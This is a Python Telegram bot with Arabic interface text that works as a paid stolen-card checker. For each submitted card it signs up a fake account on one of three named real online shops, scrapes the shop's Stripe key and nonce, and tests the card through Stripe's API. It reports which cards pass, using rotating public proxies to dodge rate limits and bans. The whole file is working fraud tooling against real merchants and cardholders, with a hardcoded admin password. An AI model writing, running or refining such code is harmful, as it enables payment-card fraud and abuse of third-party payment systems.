import telebot
import requests
import json
import re
import time
import random
import threading
import os
import sys
import sqlite3
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
from collections import OrderedDict
import logging

# ================= إعدادات التسجيل =================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ================= قراءة التوكن ومعرف الأدمن من متغيرات البيئة =================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))

if not BOT_TOKEN or not ADMIN_ID:
    print("❌ خطأ: لم يتم تعيين BOT_TOKEN أو ADMIN_ID في متغيرات البيئة")
    sys.exit(1)

try:
    bot = telebot.TeleBot(BOT_TOKEN)
    print("✅ تم التحقق من التوكن بنجاح")
except Exception as e:
    print(f"❌ خطأ في التوكن: {e}")
    sys.exit(1)

# ================= قاعدة البيانات (الاشتراكات) =================
DB_PATH = "bot_database.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        subscription_end TEXT,
        credits INTEGER DEFAULT 0,
        used_codes TEXT DEFAULT ''
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY,
        duration_days INTEGER,
        created_by INTEGER,
        used_by INTEGER DEFAULT NULL,
        used_at TEXT DEFAULT NULL,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )''')
    # جدول البروكسيات
    c.execute('''CREATE TABLE IF NOT EXISTS proxies (
        proxy TEXT PRIMARY KEY,
        success_count INTEGER DEFAULT 0,
        fail_count INTEGER DEFAULT 0,
        status TEXT DEFAULT 'active',
        last_used TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

# ================= دوال الاشتراكات =================
def is_subscription_active(user_id):
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT subscription_end, credits FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        end_str, credits = row
        if end_str:
            end_date = datetime.fromisoformat(end_str)
            if end_date > datetime.now():
                return True
        if credits and credits > 0:
            return True
    return False

def redeem_code(user_id, code):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT duration_days, used_by FROM redeem_codes WHERE code = ?", (code,))
    row = c.fetchone()
    if not row or row[1] is not None:
        conn.close()
        return False, "❌ كود غير صالح أو مستخدم من قبل"
    duration_days = row[0]
    now = datetime.now()
    c.execute("SELECT subscription_end FROM users WHERE user_id = ?", (user_id,))
    existing = c.fetchone()
    if existing and existing[0]:
        current_end = datetime.fromisoformat(existing[0])
        new_end = max(current_end, now) + timedelta(days=duration_days)
    else:
        new_end = now + timedelta(days=duration_days)
    c.execute("INSERT OR REPLACE INTO users (user_id, subscription_end) VALUES (?, ?)", (user_id, new_end.isoformat()))
    c.execute("UPDATE redeem_codes SET used_by = ?, used_at = ? WHERE code = ?", (user_id, now.isoformat(), code))
    conn.commit()
    conn.close()
    return True, f"✅ تم تفعيل الاشتراك لمدة {duration_days} يوم (ينتهي {new_end.strftime('%Y-%m-%d')})"

def generate_redeem_code(admin_user_id, days):
    code = ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZ0123456789', k=12))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO redeem_codes (code, duration_days, created_by) VALUES (?, ?, ?)", (code, days, admin_user_id))
    conn.commit()
    conn.close()
    return code

def get_all_codes():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT code, duration_days, used_by, used_at, created_at FROM redeem_codes ORDER BY created_at DESC")
    rows = c.fetchall()
    conn.close()
    return rows

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, subscription_end, credits FROM users ORDER BY user_id")
    rows = c.fetchall()
    conn.close()
    return rows

def revoke_code(code):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM redeem_codes WHERE code = ? AND used_by IS NULL", (code,))
    deleted = c.rowcount
    conn.commit()
    conn.close()
    return deleted > 0

# ================= دوال البروكسيات (مع قاعدة البيانات) =================
def add_proxy_to_db(proxy):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute("INSERT INTO proxies (proxy) VALUES (?)", (proxy,))
        conn.commit()
    except:
        pass
    conn.close()

def get_all_proxies():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT proxy, success_count, fail_count, status FROM proxies WHERE status = 'active'")
    rows = c.fetchall()
    conn.close()
    return rows

def update_proxy_success(proxy):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE proxies SET success_count = success_count + 1, status = 'active' WHERE proxy = ?", (proxy,))
    conn.commit()
    conn.close()

def update_proxy_failure(proxy):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE proxies SET fail_count = fail_count + 1 WHERE proxy = ?", (proxy,))
    c.execute("UPDATE proxies SET status = 'dead' WHERE proxy = ? AND fail_count >= 3", (proxy,))
    conn.commit()
    conn.close()

def get_proxy_count():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM proxies WHERE status = 'active'")
    count = c.fetchone()[0]
    conn.close()
    return count

# ================= ProxyPool (مدير البروكسيات المتقدم) =================
class ProxyPool:
    def __init__(self, max_retries=2, backoff_factor=1, rate_limit=10, rate_period=60):
        self.proxies = OrderedDict()
        self.lock = threading.Lock()
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self.rate_limit = rate_limit
        self.rate_period = rate_period
        self.load_from_db()

    def load_from_db(self):
        rows = get_all_proxies()
        for proxy, success, fail, status in rows:
            self.proxies[proxy] = {
                'success': success,
                'failure': fail,
                'last_used': 0,
                'status': status,
                'request_timestamps': []
            }
        logger.info(f"📁 تم تحميل {len(self.proxies)} بروكسي من قاعدة البيانات")

    def add_proxy(self, proxy):
        with self.lock:
            if proxy not in self.proxies:
                self.proxies[proxy] = {
                    'success': 0,
                    'failure': 0,
                    'last_used': 0,
                    'status': 'active',
                    'request_timestamps': []
                }
                add_proxy_to_db(proxy)
                logger.info(f"➕ تم إضافة بروكسي: {proxy}")

    def _clean_old_timestamps(self, proxy_stats):
        now = time.time()
        proxy_stats['request_timestamps'] = [ts for ts in proxy_stats['request_timestamps'] if now - ts < self.rate_period]

    def _is_rate_limited(self, proxy_stats):
        self._clean_old_timestamps(proxy_stats)
        return len(proxy_stats['request_timestamps']) >= self.rate_limit

    def get_proxy(self):
        with self.lock:
            active_proxies = [(p, stats) for p, stats in self.proxies.items() if stats['status'] == 'active']
            if not active_proxies:
                logger.warning("⚠️ لا يوجد بروكسي نشط")
                return None
            def score(stats):
                total = stats['success'] + stats['failure']
                if total == 0:
                    return 1.0
                return stats['success'] / total
            best = max(active_proxies, key=lambda x: score(x[1]))
            proxy = best[0]
            if self._is_rate_limited(self.proxies[proxy]):
                for p, stats in active_proxies:
                    if p != proxy and not self._is_rate_limited(stats):
                        proxy = p
                        break
            self.proxies[proxy]['last_used'] = time.time()
            self.proxies[proxy]['request_timestamps'].append(time.time())
            logger.info(f"🔄 تم اختيار بروكسي: {proxy}")
            return proxy

    def report_success(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies[proxy]['success'] += 1
                if self.proxies[proxy]['status'] != 'active':
                    self.proxies[proxy]['status'] = 'active'
                update_proxy_success(proxy)
                logger.info(f"✅ نجاح للبروكسي {proxy}")

    def report_failure(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies[proxy]['failure'] += 1
                fail_count = self.proxies[proxy]['failure']
                if fail_count >= 3:
                    self.proxies[proxy]['status'] = 'dead'
                elif fail_count >= 2:
                    self.proxies[proxy]['status'] = 'banned'
                update_proxy_failure(proxy)
                logger.info(f"❌ فشل للبروكسي {proxy} (فشل: {fail_count})")

    def get_stats(self):
        with self.lock:
            active = sum(1 for s in self.proxies.values() if s['status'] == 'active')
            banned = sum(1 for s in self.proxies.values() if s['status'] == 'banned')
            dead = sum(1 for s in self.proxies.values() if s['status'] == 'dead')
            return active, banned, dead

proxy_pool = ProxyPool()

# ================= دوال سحب البروكسيات من GitHub (اختيارية) =================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Mohammedcha/ProxRipper/main/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
]

def fetch_proxies_from_github():
    all_proxies = []
    for url in PROXY_SOURCES:
        try:
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                proxies = response.text.strip().splitlines()
                cleaned = []
                for p in proxies:
                    p = p.strip()
                    if p and not p.startswith('#') and ':' in p:
                        if ' ' in p:
                            p = p.split()[0]
                        cleaned.append(p)
                all_proxies.extend(cleaned)
        except:
            pass
    return list(set(all_proxies))

def check_proxy_accurate(proxy):
    try:
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        r = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=8)
        if r.status_code == 200 and r.json().get('origin'):
            return proxy
    except:
        pass
    try:
        time.sleep(0.5)
        r = requests.get("https://httpbin.org/ip", proxies=proxy_dict, timeout=5)
        if r.status_code == 200:
            return proxy
    except:
        pass
    return None

def add_proxies_to_pool(proxy_list):
    working = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_proxy_accurate, p): p for p in proxy_list}
        for future in as_completed(futures):
            res = future.result()
            if res:
                working.append(res)
                proxy_pool.add_proxy(res)
    with open("working_proxies.txt", "w") as f:
        f.write("\n".join(working))
    return working

# ================= دوال فحص البطاقات (مع ProxyPool وإعادة المحاولة) =================
def check_card_on_site(card_str, site_url, proxy=None):
    parts = card_str.split('|')
    if len(parts) != 4:
        return "INVALID_FORMAT", None
    cc, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year

    proxy_dict = None
    if proxy:
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    session = requests.Session()
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        resp = session.get(f"{site_url}/my-account/", headers=headers, proxies=proxy_dict, timeout=15)
        html = resp.text
        reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
        if not reg_nonce:
            return "FAILED_NONCE", None
        reg_nonce = reg_nonce.group(1)

        email = f"{random.randint(100000,999999)}@temp.com"
        password = "Pass123!"
        data = {
            'email': email, 'password': password, 'woocommerce-register-nonce': reg_nonce,
            'register': 'Register', '_wp_http_referer': '/my-account/'
        }
        session.post(f"{site_url}/my-account/", data=data, headers=headers, proxies=proxy_dict, timeout=15)

        resp = session.get(f"{site_url}/my-account/add-payment-method/", headers=headers, proxies=proxy_dict, timeout=15)
        html = resp.text
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
        if not pk_match or not nonce_match:
            return "FAILED_STRIPE_EXTRACT", None
        stripe_pk = pk_match.group(0)
        setup_nonce = nonce_match.group(1)

        stripe_headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://js.stripe.com'}
        stripe_data = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': month, 'card[exp_year]': year[-2:],
            'key': stripe_pk, '_stripe_version': '2024-06-20'
        }
        resp = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_data, headers=stripe_headers, proxies=proxy_dict, timeout=15)
        pm_data = resp.json()
        pm_id = pm_data.get('id')
        if not pm_id:
            return "DECLINED", None

        ajax_url = f"{site_url}/wp-admin/admin-ajax.php"
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': setup_nonce
        }
        resp = session.post(ajax_url, data=ajax_data, headers={'X-Requested-With': 'XMLHttpRequest'}, proxies=proxy_dict, timeout=15)
        result = resp.json()
        if result.get('success'):
            return "PASSED", None
        else:
            error_msg = result.get('data', {}).get('error', {}).get('message', '')
            if 'otp' in error_msg.lower() or '3d' in error_msg.lower():
                return "OTP", None
            return "DECLINED", None
    except Exception as e:
        return f"ERROR: {str(e)[:50]}", None

def check_card_with_retry(card_str, site_url):
    max_retries = proxy_pool.max_retries
    for attempt in range(max_retries):
        proxy = proxy_pool.get_proxy()
        status, _ = check_card_on_site(card_str, site_url, proxy)
        if status in ("PASSED", "OTP"):
            if proxy:
                proxy_pool.report_success(proxy)
            return status
        else:
            if proxy:
                proxy_pool.report_failure(proxy)
            if attempt < max_retries - 1:
                time.sleep(proxy_pool.backoff_factor * (2 ** attempt))
    return "DECLINED"

# ================= بوابات الفحص =================
GATES = {
    '1': {'name': '🏦 بوابة كوبنهاجن سيلفر', 'site': 'https://copenhagensilver.com'},
    '2': {'name': '💳 بوابة سبوكان شيرت', 'site': 'https://www.spokaneshirtco.com'},
    '3': {'name': '🔥 بوابة فور أول بروموز', 'site': 'https://www.4allpromos.com'}
}
user_gate_choice = {}

def get_bin_info(bin6):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("scheme", "Unknown").upper(),
                "type": data.get("type", "Unknown").capitalize(),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "flag": data.get("country", {}).get("emoji", "🌍")
            }
    except:
        pass
    return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🌍"}

def process_single_card(card, idx, total, chat_id, gate_id):
    site_url = GATES[gate_id]['site']
    status = check_card_with_retry(card, site_url)
    bin6 = card.split('|')[0][:6]
    bin_info = get_bin_info(bin6)

    if status == "PASSED":
        emoji, result_text = "✅", "PASSED (تمت الإضافة)"
    elif status == "OTP":
        emoji, result_text = "⚠️", "OTP REQUIRED (يطلب تحقق)"
    else:
        emoji, result_text = "❌", "DECLINED"

    msg = f"""{emoji} **{result_text}** | {GATES[gate_id]['name']}
`{card}`
**BIN:** {bin6}
**Brand:** {bin_info['brand']}
**Type:** {bin_info['type']}
**Bank:** {bin_info['bank']}
**Country:** {bin_info['country']} {bin_info['flag']}
╔════════════════════╗
║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
╚════════════════════╝
**Progress:** {idx}/{total}"""
    bot.send_message(chat_id, msg, parse_mode="Markdown")
    return status

def check_cards(cards_text, chat_id, message_id, gate_id):
    cards = [c.strip() for c in cards_text.splitlines() if "|" in c and len(c.split('|')) == 4]
    if not cards:
        bot.edit_message_text("❌ لم يتم العثور على بطاقات صالحة. الصيغة: رقم|شهر|سنة|cvv", chat_id, message_id)
        return
    total = len(cards)
    bot.edit_message_text(f"🚀 بدء فحص {total} بطاقة باستخدام {GATES[gate_id]['name']}...", chat_id, message_id)
    passed = otp = declined = 0
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(process_single_card, card, idx, total, chat_id, gate_id): card for idx, card in enumerate(cards, 1)}
        for future in as_completed(futures):
            try:
                status = future.result()
                if status == "PASSED":
                    passed += 1
                elif status == "OTP":
                    otp += 1
                else:
                    declined += 1
            except:
                declined += 1
    summary = f"""🏁 **ملخص الفحص** ({GATES[gate_id]['name']})
✅ PASSED: {passed}
⚠️ OTP: {otp}
❌ DECLINED: {declined}
╔════════════════════╗
║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
╚════════════════════╝"""
    bot.send_message(chat_id, summary, parse_mode="Markdown")

# ================= لوحة الإدارة (للأدمن فقط - أمر مخفي) =================
admin_session = {}

@bot.message_handler(commands=['admin'])
def admin_login(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    bot.send_message(user_id, "🔐 **الوصول إلى لوحة الإدارة**\nالرجاء إدخال كلمة المرور:", parse_mode="Markdown")
    admin_session[user_id] = 'awaiting_password'

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_password')
def check_admin_password(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    if message.text.strip() == "Nemo@1986":
        admin_session[user_id] = 'authenticated'
        show_admin_menu(user_id)
    else:
        bot.send_message(user_id, "❌ كلمة المرور خاطئة. تم إلغاء الدخول.")
        admin_session.pop(user_id, None)

def show_admin_menu(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ إنشاء كود", callback_data="admin_create_code"),
        types.InlineKeyboardButton("📋 عرض الأكواد", callback_data="admin_view_codes"),
        types.InlineKeyboardButton("👥 عرض المستخدمين", callback_data="admin_view_users"),
        types.InlineKeyboardButton("🗑️ إلغاء كود", callback_data="admin_revoke_code"),
        types.InlineKeyboardButton("📡 جلب بروكسيات GitHub", callback_data="admin_fetch_proxies"),
        types.InlineKeyboardButton("📊 حالة البروكسيات", callback_data="admin_proxy_stats"),
        types.InlineKeyboardButton("❌ خروج", callback_data="admin_logout")
    )
    bot.send_message(user_id, "🛠️ **لوحة إدارة البوت**\nاختر أحد الخيارات:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback(call):
    user_id = call.from_user.id
    if user_id != ADMIN_ID or admin_session.get(user_id) != 'authenticated':
        bot.answer_callback_query(call.id, "غير مصرح لك.")
        return
    data = call.data
    if data == "admin_create_code":
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, "📅 أرسل عدد الأيام التي يصلح فيها الكود (رقم فقط):")
        admin_session[user_id] = 'awaiting_days'
    elif data == "admin_view_codes":
        bot.answer_callback_query(call.id)
        view_all_codes(user_id)
    elif data == "admin_view_users":
        bot.answer_callback_query(call.id)
        view_all_users(user_id)
    elif data == "admin_revoke_code":
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, "✏️ أرسل الكود الذي تريد إلغاءه (لم يُستخدم بعد):")
        admin_session[user_id] = 'awaiting_revoke'
    elif data == "admin_fetch_proxies":
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, "📡 جاري سحب بروكسيات من GitHub...")
        threading.Thread(target=fetch_and_add_proxies, args=(user_id,)).start()
    elif data == "admin_proxy_stats":
        bot.answer_callback_query(call.id)
        active, banned, dead = proxy_pool.get_stats()
        bot.send_message(user_id, f"📊 **حالة البروكسيات:**\n🟢 نشط: {active}\n🟡 محظور: {banned}\n🔴 ميت: {dead}", parse_mode="Markdown")
    elif data == "admin_logout":
        admin_session.pop(user_id, None)
        bot.answer_callback_query(call.id, "تم تسجيل الخروج")
        bot.send_message(user_id, "👋 تم تسجيل الخروج من لوحة الإدارة.")

def fetch_and_add_proxies(user_id):
    proxies = fetch_proxies_from_github()
    if proxies:
        working = add_proxies_to_pool(proxies)
        bot.send_message(user_id, f"✅ تمت إضافة {len(working)} بروكسي شغال من GitHub.")
    else:
        bot.send_message(user_id, "❌ فشل سحب البروكسيات.")

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_days')
def create_code_days(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    try:
        days = int(message.text.strip())
        if days <= 0:
            raise ValueError
        code = generate_redeem_code(user_id, days)
        bot.send_message(user_id, f"✅ **تم إنشاء الكود بنجاح**\n📌 الكود: `{code}`\n📅 المدة: {days} يوم", parse_mode="Markdown")
    except:
        bot.send_message(user_id, "❌ عدد أيام غير صحيح. أرسل رقماً موجباً.")
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_revoke')
def revoke_code_input(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    code = message.text.strip()
    if revoke_code(code):
        bot.send_message(user_id, f"✅ تم إلغاء الكود `{code}` بنجاح (إذا كان موجوداً وغير مستخدم).")
    else:
        bot.send_message(user_id, f"❌ فشل إلغاء الكود. تأكد أن الكود صحيح ولم يُستخدم بعد.")
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

def view_all_codes(user_id):
    codes = get_all_codes()
    if not codes:
        bot.send_message(user_id, "📭 لا توجد أكواد مسجلة.")
        return
    msg = "📜 **قائمة الأكواد:**\n\n"
    for code, days, used_by, used_at, created_at in codes[:30]:
        status = "✅ مستخدم" if used_by else "🟢 غير مستخدم"
        used_info = f"بواسطة {used_by}" if used_by else ""
        msg += f"`{code}` | {days} يوم | {status} {used_info}\n"
    if len(codes) > 30:
        msg += f"\n... و {len(codes)-30} أخرى"
    bot.send_message(user_id, msg, parse_mode="Markdown")

def view_all_users(user_id):
    users = get_all_users()
    if not users:
        bot.send_message(user_id, "📭 لا يوجد مستخدمون.")
        return
    msg = "👥 **قائمة المستخدمين:**\n\n"
    for uid, end_str, credits in users[:50]:
        if uid == ADMIN_ID:
            continue
        if end_str:
            end_date = datetime.fromisoformat(end_str)
            remaining = (end_date - datetime.now()).days
            if remaining < 0:
                status = "منتهي"
            else:
                status = f"متبقي {remaining} يوم"
        else:
            status = "بدون اشتراك"
        msg += f"🆔 {uid} | {status}\n"
    bot.send_message(user_id, msg, parse_mode="Markdown")

# ================= أوامر البوت العامة =================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        bot.reply_to(message, "👋 مرحباً أدمن! استخدم /admin للوحة التحكم، أو أرسل بطاقات للفحص بعد اختيار بوابة.")
    else:
        if is_subscription_active(user_id):
            bot.reply_to(message, "👋 مرحباً! اشتراكك نشط. استخدم /gate لاختيار بوابة، ثم أرسل البطاقات.")
        else:
            bot.reply_to(message, "⛔ ليس لديك اشتراك نشط. استخدم `/redeem <الكود>` لتفعيل الاشتراك.", parse_mode="Markdown")

@bot.message_handler(commands=['redeem'])
def redeem(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        bot.reply_to(message, "أنت الأدمن، لا تحتاج لتفعيل اشتراك.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ الاستخدام: `/redeem <الكود>`", parse_mode="Markdown")
        return
    code = parts[1].strip()
    success, msg = redeem_code(user_id, code)
    bot.reply_to(message, msg)

@bot.message_handler(commands=['gate'])
def gate_command(message):
    user_id = message.from_user.id
    if not is_subscription_active(user_id):
        bot.reply_to(message, "⛔ اشتراكك غير نشط. استخدم /redeem")
        return
    markup = types.InlineKeyboardMarkup(row_width=1)
    for gid, info in GATES.items():
        markup.add(types.InlineKeyboardButton(info['name'], callback_data=f"gate_{gid}"))
    bot.send_message(user_id, "🎯 اختر بوابة الفحص:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('gate_'))
def select_gate(call):
    user_id = call.from_user.id
    if not is_subscription_active(user_id):
        bot.answer_callback_query(call.id, "اشتراكك غير نشط")
        return
    gate_id = call.data.split('_')[1]
    user_gate_choice[user_id] = gate_id
    bot.edit_message_text(f"✅ تم اختيار {GATES[gate_id]['name']}\nأرسل الآن البطاقات (رقم|شهر|سنة|cvv)", call.message.chat.id, call.message.message_id)

@bot.message_handler(commands=['status'])
def status(message):
    if message.from_user.id != ADMIN_ID:
        return
    active, banned, dead = proxy_pool.get_stats()
    bot.reply_to(message, f"📊 **حالة البروكسيات:**\n🟢 نشط: {active}\n🟡 محظور: {banned}\n🔴 ميت: {dead}", parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    user_id = message.from_user.id
    if not is_subscription_active(user_id):
        bot.reply_to(message, "⛔ اشتراكك غير نشط")
        return
    gate_id = user_gate_choice.get(user_id)
    if not gate_id:
        bot.reply_to(message, "❌ لم تختر بوابة بعد. استخدم /gate")
        return
    file_info = bot.get_file(message.document.file_id)
    content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
    filename = message.document.file_name.lower()
    if "proxy" in filename:
        proxies = [p.strip() for p in content.splitlines() if p.strip() and ':' in p]
        if proxies:
            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
            bot.reply_to(message, f"🔍 جاري إضافة {len(proxies)} بروكسي...")
        else:
            bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
    else:
        sent_msg = bot.reply_to(message, f"🚀 جاري الفحص...")
        threading.Thread(target=check_cards, args=(content, message.chat.id, sent_msg.message_id, gate_id)).start()

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = message.from_user.id
    if not is_subscription_active(user_id):
        bot.reply_to(message, "⛔ اشتراكك غير نشط")
        return
    gate_id = user_gate_choice.get(user_id)
    if not gate_id:
        bot.reply_to(message, "❌ لم تختر بوابة بعد. استخدم /gate")
        return
    text = message.text.strip()
    if ":" in text and "|" not in text:
        proxies = [p.strip() for p in text.splitlines() if p.strip() and ':' in p]
        if proxies:
            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
            bot.reply_to(message, f"🔍 جاري إضافة {len(proxies)} بروكسي...")
        else:
            bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
    elif "|" in text:
        sent_msg = bot.reply_to(message, f"🚀 جاري الفحص...")
        threading.Thread(target=check_cards, args=(text, message.chat.id, sent_msg.message_id, gate_id)).start()
    else:
        bot.reply_to(message, "❌ أرسل بروكسيات (ip:port) أو بطاقات (رقم|شهر|سنة|cvv)")

# ================= تشغيل البوت =================
print("✅ البوت شغال مع ProxyPool ونظام اشتراكات ولوحة إدارة مخفية")
print("🔥 التوقيع: 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆")
print(f"👤 الأدمن ID: {ADMIN_ID}")
bot.infinity_polling()